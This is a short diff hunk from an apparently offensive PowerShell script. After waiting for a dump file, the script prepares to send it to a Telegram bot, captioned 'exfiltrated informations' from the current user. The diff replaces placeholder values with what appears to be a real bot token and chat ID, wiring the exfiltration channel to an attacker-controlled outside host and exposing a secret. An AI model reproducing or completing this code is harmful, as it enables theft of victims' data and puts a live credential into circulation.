@@ -44,8 +44,8 @@ while (!(Test-Path "$dumpFile")) {
 }
 
 # Telegram configuration
-$token = "<TOKEN>"
-$chatID = "<CHATID>"
+$token = "7232525698:AAH56MUmwqkVV144i4B5iM89kC6-8me8T7A"
+$chatID = "7183053371"
 $uri = "https://api.telegram.org/bot$token/sendDocument"
 $caption = "Here are exfiltrated informations from $env:USERNAME"
 
